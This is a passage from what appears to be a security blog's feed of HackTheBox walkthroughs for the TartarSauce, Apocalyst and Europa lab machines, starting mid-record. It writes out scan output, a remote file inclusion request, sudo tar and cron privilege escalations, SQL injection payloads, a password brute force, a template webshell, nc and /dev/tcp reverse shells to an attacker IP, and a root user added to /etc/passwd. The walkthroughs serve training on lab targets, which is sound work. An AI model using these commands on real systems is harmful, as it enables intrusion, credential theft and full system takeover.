http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/ | Last Updated: 2023-09-29T11:20:00.000Z | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt | [!] The version is out of date, the latest version is 4.6.1 | | Found By: Known Locations (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200 | | Version: 2.3.10 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Tue Oct 17 19:10:26 2023 [+] Requests Done: 1510 [+] Cached Requests: 32 [+] Data Sent: 449.591 KB [+] Data Received: 261.322 KB [+] Memory used: 200.883 MB [+] Elapsed time: 00:01:07 Foothold We have few plugins installed http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt If we check changelogs, we see that the actual version is 1.5.3 RFI in 1.5.3 version of Gwolle Guestbook WordPress plugin curl http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.9/test I\u0026rsquo;ll have to rename a reverse shell file to wp-load.php I used /usr/share/webshells/php/php-reverse-shell.php User sudo rights www-data@TartarSauce:/var/www/html$ sudo -l Matching Defaults entries for www-data on TartarSauce: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on TartarSauce: (onuma) NOPASSWD: /bin/tar gtfobins www-data@TartarSauce:/var/www/html$ sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash /bin/tar: Removing leading `/\u0026#39; from member names onuma@TartarSauce:/var/www/html$ id uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev) onuma@TartarSauce:/var/www/html$ Root I ran pspy32 Content onuma@TartarSauce:/tmp$ cat /usr/sbin/backuperer #!/bin/bash #------------------------------------------------------------------------------------- # backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ # ONUMA Dev auto backup program # This tool will keep our webapp backed up incase another skiddie defaces us again. # We will be able to quickly restore from a backup in seconds ;P #------------------------------------------------------------------------------------- # Set Vars Here basedir=/var/www/html bkpdir=/var/backups tmpdir=/var/tmp testmsg=$bkpdir/onuma_backup_test.txt errormsg=$bkpdir/onuma_backup_error.txt tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d\u0026#39; \u0026#39; -f1) check=$tmpdir/check # formatting printbdr() { for n in $(seq 72); do /usr/bin/printf $\u0026#34;-\u0026#34;; done } bdr=$(printbdr) # Added a test file to let us see when the last backup was run /usr/bin/printf $\u0026#34;$bdr\\nAuto backup backuperer backup last ran at : $(/bin/date)\\n$bdr\\n\u0026#34; \u0026gt; $testmsg # Cleanup from last time. /bin/rm -rf $tmpdir/.* $check # Backup onuma website dev files. /usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir \u0026amp; # Added delay to wait for backup to complete if large files get added. /bin/sleep 30 # Test the backup integrity integrity_chk() { /usr/bin/diff -r $basedir $check$basedir } /bin/mkdir $check /bin/tar -zxvf $tmpfile -C $check if [[ $(integrity_chk) ]] then # Report errors so the dev can investigate the issue. /usr/bin/printf $\u0026#34;$bdr\\nIntegrity Check Error in backup last ran : $(/bin/date)\\n$bdr\\n$tmpfile\\n\u0026#34; \u0026gt;\u0026gt; $errormsg integrity_chk \u0026gt;\u0026gt; $errormsg exit 2 else # Clean up and save archive to the bkpdir. /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak /bin/rm -rf $check .* exit 0 fi We can exploit it by adding a link to /root/root.txt to archive during sleep The content of the flag will be displayed in error logs The archive will be located in /var/tmp/.[hash] We will use script #!/bin/bash file=$(find /var/tmp -type f -name \u0026#34;.*\u0026#34;) cp $file . filename=$(echo $file | cut -d\u0026#39;/\u0026#39; -f4) tar -zxf $filename rm var/www/html/robots.txt ln -s /root/root.txt var/www/html/robots.txt rm $filename tar czf $filename var mv $filename $file rm $filename rm -rf var tail -f /var/backups/onuma_backup_error.txt As soon as we see an archive in /var/tmp, we execute our script and get our flag ","date":"October 17, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/tartarsauce/images/tartarsauce.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/tartarsauce/","summary":"TartarSauce Enumeration nmap └─$ nmap -Pn -p- 10.10.10.88 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-17 18:17 BST Nmap scan report for 10.10.10.88 (10.10.10.88) Host is up (0.10s latency). Not shown: 65449 filtered tcp ports (no-response), 85 closed tcp ports (conn-refused) PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 13.74 seconds └─$ nmap -Pn -p80 -sC -sV 10.10.10.88 --min-rate 10000 Starting Nmap 7.","tags":["HTB","wordpress","wpscan","php","webshell","rfi","sudo","tar","pspy","cron"],"title":"[HTB] Machine: TartarSauce"},{"categories":null,"contents":"Apocalyst Enumeration nmap └─$ nmap -Pn -p- 10.10.10.46 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-16 19:06 BST Warning: 10.10.10.46 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.46 (10.10.10.46) Host is up (0.10s latency). Not shown: 57797 filtered tcp ports (no-response), 7736 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 69.43 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.46 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-16 19:12 BST Nmap scan report for 10.10.10.46 (10.10.10.46) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 fd:ab:0f:c9:22:d5:f4:8f:7a:0a:29:11:b4:04:da:c9 (RSA) | 256 76:92:39:0a:57:bd:f0:03:26:78:c7:db:1a:66:a5:bc (ECDSA) |_ 256 12:12:cf:f1:7f:be:43:1f:d5:e6:6d:90:84:25:c8:bd (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Apocalypse Preparation Blog |_http-generator: WordPress 4.8 |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.15 seconds Web Server If we add apocalyst.htb to /etc/hosts, we have a fixed web page wpscan └─$ wpscan --url http://apocalyst.htb/ -e ap,t,tt,u _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.25 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] It seems like you have not updated the database for some time. [?] Do you want to update now? [Y]es [N]o, default: [N]n [+] URL: http://apocalyst.htb/ [10.10.10.46] [+] Started: Mon Oct 16 19:16:07 2023 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://apocalyst.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://apocalyst.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://apocalyst.htb/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://apocalyst.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.8 identified (Insecure, released on 2017-06-08). | Found By: Rss Generator (Passive Detection) | - http://apocalyst.htb/?feed=rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.8\u0026lt;/generator\u0026gt; | - http://apocalyst.htb/?feed=comments-rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.8\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentyseventeen | Location: http://apocalyst.htb/wp-content/themes/twentyseventeen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://apocalyst.htb/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://apocalyst.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://apocalyst.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: \u0026#39;Version: 1.3\u0026#39; [+] Enumerating All Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Most Popular Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:20 \u0026lt;============================================================================================================================================================\u0026gt; (399 / 399) 100.00% Time: 00:00:20 [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] Theme(s) Identified: [+] twentyfifteen | Location: http://apocalyst.htb/wp-content/themes/twentyfifteen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://apocalyst.htb/wp-content/themes/twentyfifteen/readme.txt | [!] The version is out of date, the latest version is 3.4 | Style URL: http://apocalyst.htb/wp-content/themes/twentyfifteen/style.css | Style Name: Twenty Fifteen | Style URI: https://wordpress.org/themes/twentyfifteen/ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen\u0026#39;s simple, st... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://apocalyst.htb/wp-content/themes/twentyfifteen/, status: 500 | | Version: 1.8 (80% confidence) | Found By: Style (Passive Detection) | - http://apocalyst.htb/wp-content/themes/twentyfifteen/style.css, Match: \u0026#39;Version: 1.8\u0026#39; [+] twentyseventeen | Location: http://apocalyst.htb/wp-content/themes/twentyseventeen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://apocalyst.htb/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://apocalyst.htb/wp-content/themes/twentyseventeen/style.css | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Urls In Homepage (Passive Detection) | Confirmed By: Known Locations (Aggressive Detection) | - http://apocalyst.htb/wp-content/themes/twentyseventeen/, status: 500 | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://apocalyst.htb/wp-content/themes/twentyseventeen/style.css, Match: \u0026#39;Version: 1.3\u0026#39; [+] twentysixteen | Location: http://apocalyst.htb/wp-content/themes/twentysixteen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://apocalyst.htb/wp-content/themes/twentysixteen/readme.txt | [!] The version is out of date, the latest version is 2.9 | Style URL: http://apocalyst.htb/wp-content/themes/twentysixteen/style.css | Style Name: Twenty Sixteen | Style URI: https://wordpress.org/themes/twentysixteen/ | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://apocalyst.htb/wp-content/themes/twentysixteen/, status: 500 | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://apocalyst.htb/wp-content/themes/twentysixteen/style.css, Match: \u0026#39;Version: 1.3\u0026#39; [+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:02:22 \u0026lt;==========================================================================================================================================================\u0026gt; (2575 / 2575) 100.00% Time: 00:02:22 [i] No Timthumbs Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:00 \u0026lt;==============================================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:00 [i] User(s) Identified: [+] falaraki | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Mon Oct 16 19:19:01 2023 [+] Requests Done: 3039 [+] Cached Requests: 21 [+] Data Sent: 845.594 KB [+] Data Received: 1.161 MB [+] Memory used: 288.852 MB [+] Elapsed time: 00:02:54 gobuster └─$ gobuster dir -u http://apocalyst.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50 -x txt,php -k =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://apocalyst.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 292] /index.php (Status: 301) [Size: 0] [--\u0026gt; http://apocalyst.htb/] /blog (Status: 301) [Size: 313] [--\u0026gt; http://apocalyst.htb/blog/] /events (Status: 301) [Size: 315] [--\u0026gt; http://apocalyst.htb/events/] /main (Status: 301) [Size: 313] [--\u0026gt; http://apocalyst.htb/main/] /info (Status: 301) [Size: 313] [--\u0026gt; http://apocalyst.htb/info/] /page (Status: 301) [Size: 313] [--\u0026gt; http://apocalyst.htb/page/] /site (Status: 301) [Size: 313] [--\u0026gt; http://apocalyst.htb/site/] /header (Status: 301) [Size: 315] [--\u0026gt; http://apocalyst.htb/header/] /wp-content (Status: 301) [Size: 319] [--\u0026gt; http://apocalyst.htb/wp-content/] /post (Status: 301) [Size: 313] [--\u0026gt; http://apocalyst.htb/post/] /text (Status: 301) [Size: 313] [--\u0026gt; http://apocalyst.htb/text/] /book (Status: 301) [Size: 313] [--\u0026gt; http://apocalyst.htb/book/] /art (Status: 301) [Size: 312] [--\u0026gt; http://apocalyst.htb/art/] /start (Status: 301) [Size: 314] [--\u0026gt; http://apocalyst.htb/start/] /icon (Status: 301) [Size: 313] [--\u0026gt; http://apocalyst.htb/icon/] /pictures (Status: 301) [Size: 317] [--\u0026gt; http://apocalyst.htb/pictures/] /wp-login.php (Status: 200) [Size: 2460] /personal (Status: 301) [Size: 317] [--\u0026gt; http://apocalyst.htb/personal/] /information (Status: 301) [Size: 320] [--\u0026gt; http://apocalyst.htb/information/] /reference (Status: 301) [Size: 318] [--\u0026gt; http://apocalyst.htb/reference/] /entry (Status: 301) [Size: 314] [--\u0026gt; http://apocalyst.htb/entry/] /license.txt (Status: 200) [Size: 19935] /get (Status: 301) [Size: 312] [--\u0026gt; http://apocalyst.htb/get/] /wp-includes (Status: 301) [Size: 320] [--\u0026gt; http://apocalyst.htb/wp-includes/] /state (Status: 301) [Size: 314] [--\u0026gt; http://apocalyst.htb/state/] /custom (Status: 301) [Size: 315] [--\u0026gt; http://apocalyst.htb/custom/] /language (Status: 301) [Size: 317] [--\u0026gt; http://apocalyst.htb/language/] /down (Status: 301) [Size: 313] [--\u0026gt; http://apocalyst.htb/down/] /term (Status: 301) [Size: 313] [--\u0026gt; http://apocalyst.htb/term/] /org (Status: 301) [Size: 312] [--\u0026gt; http://apocalyst.htb/org/] /masthead (Status: 301) [Size: 317] [--\u0026gt; http://apocalyst.htb/masthead/] ... Foothold/User The next part is more CTF-based We can create a wordlist using cewl └─$ cewl apocalyst.htb -w apocalyst.htb.wordlist --with-numbers CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/) Then we wfuzz again to find a new endpoint └─$ wfuzz -u http://apocalyst.htb/FUZZ/ -w apocalyst.htb.wordlist --hh 157 --hc 404 -t 40 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://apocalyst.htb/FUZZ/ Total requests: 546 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000476: 200 14 L 20 W 175 Ch \u0026#34;Rightiousness\u0026#34; Total time: 0 Processed Requests: 546 Filtered Requests: 545 Requests/sec.: 0 Page Download the image and run steghide Empty password └─$ steghide extract -sf apocalyst.jpg Enter passphrase: wrote extracted data to \u0026#34;list.txt\u0026#34;. └─$ head list.txt World song from disambiguation Wikipedia album page this world Edit Now we run bruteforce falaraki using the list we got from steghide └─$ wpscan --url http://apocalyst.htb --passwords list.txt --usernames falaraki ... [+] Performing password attack on Wp Login against 1 user/s [SUCCESS] - falaraki / Transclisiation Trying falaraki / total Time: 00:00:24 \u0026lt;================================================================ \u0026gt; (335 / 821) 40.80% ETA: ??:??:?? [!] Valid Combinations Found: | Username: falaraki, Password: Transclisiation [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Mon Oct 16 19:36:51 2023 [+] Requests Done: 508 [+] Cached Requests: 5 [+] Data Sent: 156.176 KB [+] Data Received: 1.607 MB [+] Memory used: 238.828 MB [+] Elapsed time: 00:00:40 Use the creds to access admin.php We can edit 404.php template Now we have to find a page that will trigger 404 error code And we have our web shell Let\u0026rsquo;s get reverse shell url-encode rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.9 6666 \u0026gt;/tmp/f Root /etc/passwd is writable ╔══════════╣ Permissions in init, init.d, systemd, and rc.d ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d ═╣ Hashes inside passwd file? ........... No ═╣ Writable passwd file? ................ /etc/passwd is writable ═╣ Credentials in fstab/mtab? ........... No ═╣ Can I read shadow files? ............. No ═╣ Can I read shadow plists? ............ No ═╣ Can I write shadow plists? ........... No ═╣ Can I read opasswd file? ............. No ═╣ Can I write in network-scripts? ...... No ═╣ Can I read root folder? .............. No Let\u0026rsquo;s create a user └─$ openssl passwd -1 pentest $1$2pMfZqDY$iE5J/GYlP4weF/pnpYuzH1 Add line in /etc/passwd [user]:[hash including $[type]$[salt]$[hash]]:[userid]:[groupid]:[comment]:[homedir]:[shell] pentest:$1$2pMfZqDY$iE5J/GYlP4weF/pnpYuzH1:0:0:pentest:,,,:/root:/bin/bash Change user and get root.txt ","date":"October 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/apocalyst/images/apocalyst.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/apocalyst/","summary":"Apocalyst Enumeration nmap └─$ nmap -Pn -p- 10.10.10.46 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-16 19:06 BST Warning: 10.10.10.46 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.46 (10.10.10.46) Host is up (0.10s latency). Not shown: 57797 filtered tcp ports (no-response), 7736 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 69.","tags":["HTB","wordpress","wpscan","wfuzz","steghide","passwd"],"title":"[HTB] Machine: Apocalyst"},{"categories":null,"contents":"Europa Enumeration nmap └─$ nmap -Pn -p- 10.10.10.22 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-16 18:03 BST Nmap scan report for 10.10.10.22 (10.10.10.22) Host is up (0.11s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 36.67 seconds └─$ nmap -Pn -p22,80,443 -sC -sV 10.10.10.22 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-16 18:05 BST Nmap scan report for 10.10.10.22 (10.10.10.22) Host is up (0.13s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA) | 256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA) |_ 256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) | ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR | Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb | Not valid before: 2017-04-19T09:06:22 |_Not valid after: 2027-04-17T09:06:22 | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.79 seconds Web Server Add hosts from nmap results to /etc/hosts vhosts └─$ wfuzz -u https://europacorp.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H \u0026#39;Host: FUZZ.europacorp.htb\u0026#39; --hh 12455 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: https://europacorp.htb/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== feroxbuster └─$ feroxbuster -u http://europacorp.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://europacorp.htb 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💲 Extensions │ [php, txt] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 403 GET 11l 32w -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 200 GET 15l 74w 6143c http://europacorp.htb/icons/ubuntu-logo.png 200 GET 421l 1049w 12455c http://europacorp.htb/ Foothold/User We can trigger sql error on https://admin-portal.europacorp.htb/login.php by setting email parameter to ' We can use sqlmap to dump the database └─$ sqlmap -r sqli.req --batch --force-ssl ... POST parameter \u0026#39;email\u0026#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 346 HTTP(s) requests: --- Parameter: email (POST) Type: boolean-based blind Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause Payload: email=admin\u0026#39; RLIKE (SELECT (CASE WHEN (8085=8085) THEN 0x61646d696e ELSE 0x28 END))-- TKjM\u0026amp;password=admin\u0026amp;remember=Remember Me Type: error-based Title: MySQL \u0026gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET) Payload: email=admin\u0026#39; AND GTID_SUBSET(CONCAT(0x717a6a7071,(SELECT (ELT(8351=8351,1))),0x716b6b7171),8351)-- VZJu\u0026amp;password=admin\u0026amp;remember=Remember Me Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: email=admin\u0026#39; AND (SELECT 9406 FROM (SELECT(SLEEP(5)))ueXW)-- XqsJ\u0026amp;password=admin\u0026amp;remember=Remember Me --- ... └─$ sqlmap -r sqli.req --batch --force-ssl --dbs ... [18:24:53] [INFO] fetching database names [18:24:55] [INFO] retrieved: \u0026#39;information_schema\u0026#39; [18:24:55] [INFO] retrieved: \u0026#39;admin\u0026#39; available databases [2]: [*] admin [*] information_schema ... └─$ sqlmap -r sqli.req --batch --force-ssl -D admin --tables ... [18:26:13] [INFO] retrieved: \u0026#39;users\u0026#39; Database: admin [1 table] +-------+ | users | +-------+ ... └─$ sqlmap -r sqli.req --batch --force-ssl -D admin -T users --dump ... Database: admin Table: users [2 entries] +----+----------------------+----------+----------------------------------+---------------+ | id | email | active | password | username | +----+----------------------+----------+----------------------------------+---------------+ | 1 | admin@europacorp.htb | 1 | 2b6d315337f18617ba18922c0b9597ff | administrator | | 2 | john@europacorp.htb | 1 | 2b6d315337f18617ba18922c0b9597ff | john | +----+----------------------+----------+----------------------------------+---------------+ ... The password is SuperSecretPassword! https://md5hashing.net/hash/md5/2b6d315337f18617ba18922c0b9597ff Anothey way to bypass the login is to send admin@europacorp.htb';-- - Guessing the email of the admin Also error indicated that the query has the following form: SELECT * FROM users WHERE email='$email' and password='hash'; So after payload we would have: SELECT * FROM users WHERE email='admin@europacorp.htb';-- - and password='hash'; Now, let\u0026rsquo;s check the application We have tools.php Where we can specify ip which will be inserted to config The request looks like a regex replacement If we google for PHP regex pattern vulnerability we find few posts about Command Execution - preg_replace() https://ik0nw.github.io/2020/09/23/PHP::Preg_replace()-RCE/index.html Let\u0026rsquo;s get reverse shell Root We have cronjobs folder www-data@europa:/var/www$ ls -lha total 24K drwxr-xr-x 6 root root 4.0K May 17 2022 . drwxr-xr-x 14 root root 4.0K May 17 2022 .. drwxr-xr-x 7 root root 4.0K May 17 2022 admin drwxrwxr-x 2 root www-data 4.0K May 17 2022 cmd drwxr-xr-x 2 root root 4.0K Jun 23 2017 cronjobs drwxr-xr-x 2 root root 4.0K Jul 27 2017 html Content www-data@europa:/var/www/cronjobs$ ls -lha total 12K drwxr-xr-x 2 root root 4.0K Jun 23 2017 . drwxr-xr-x 6 root root 4.0K May 17 2022 .. -r-xr-xr-x 1 root root 132 May 12 2017 clearlogs www-data@europa:/var/www/cronjobs$ cat clearlogs #!/usr/bin/php \u0026lt;?php $file = \u0026#39;/var/www/admin/logs/access.log\u0026#39;; file_put_contents($file, \u0026#39;\u0026#39;); exec(\u0026#39;/var/www/cmd/logcleared.sh\u0026#39;); ?\u0026gt; But script doesn\u0026rsquo;t exist www-data@europa:/var/www/cronjobs$ ls -lha /var/www/cmd/logcleared.sh ls: cannot access \u0026#39;/var/www/cmd/logcleared.sh\u0026#39;: No such file or directory And the job is running every minute www-data@europa:/var/www/cronjobs$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # * * * * * root /var/www/cronjobs/clearlogs Let\u0026rsquo;s create the script and get our root shell #!/bin/bash /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.9/7777 0\u0026gt;\u0026amp;1 www-data@europa:/var/www/cronjobs$ vim /var/www/cmd/logcleared.sh 